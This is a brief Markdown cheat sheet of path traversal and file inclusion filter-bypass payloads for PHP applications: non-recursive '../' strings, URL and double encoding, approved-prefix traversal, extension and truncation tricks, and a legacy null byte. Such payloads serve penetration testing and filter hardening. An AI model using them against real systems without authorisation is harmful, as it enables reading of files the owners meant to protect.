# File Inclusion — Basic Bypass Payloads

## 1. Non-Recursive Path Traversal

If `../` is removed once:

```text
....//
..././
....\/
```



---

## 2. URL Encoding

Basic traversal:

```text
../
```

URL-encoded:

```text
%2e%2e%2f
```

Double-encoded traversal can also be tested when multiple decoding stages exist:

```text
%252e%252e%252f
```



---

## 3. Approved Path Bypass

If the application requires:

```text
./languages/
```

the concept is to keep the approved prefix and add traversal:

```text
./languages/../../
```

or with encoding:

```text
./languages/%2e%2e/%2e%2e/
```



---

## 4. Appended Extension

If the application automatically adds:

```text
.php
```

the supplied filename may become:

```text
filename.php
```

Legacy bypass techniques may be relevant depending on the application/PHP version.



---

## 5. Path Truncation

Legacy PHP technique using an excessively long path:

```text
../[very long sequence]
```

The technique relied on older PHP path-length behavior and is **version dependent**.



---

## 6. Null Byte — Legacy

Payload:

```text
%00
```

Example concept:

```text
filename%00.php
```

This was applicable to older PHP versions and **does not work on modern PHP**.
